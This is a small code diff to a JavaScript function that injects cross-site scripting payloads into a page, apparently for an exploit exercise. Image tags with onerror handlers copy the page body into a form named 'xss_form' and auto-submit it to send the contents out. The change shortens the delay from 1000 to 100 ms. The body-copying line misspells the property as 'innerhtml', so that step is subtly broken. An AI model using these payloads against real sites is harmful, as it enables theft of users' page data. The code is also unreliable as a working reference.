@@ -8,6 +8,6 @@ function changeTitle(){
             <img src="x" onerror="document.forms.xss_form.elements.info.value = document.body.innerhtml">\
             <img src="x" onerror="document.forms.xss_form.submit()">';
             
-    }, 1000);
+    }, 100);
     
 }
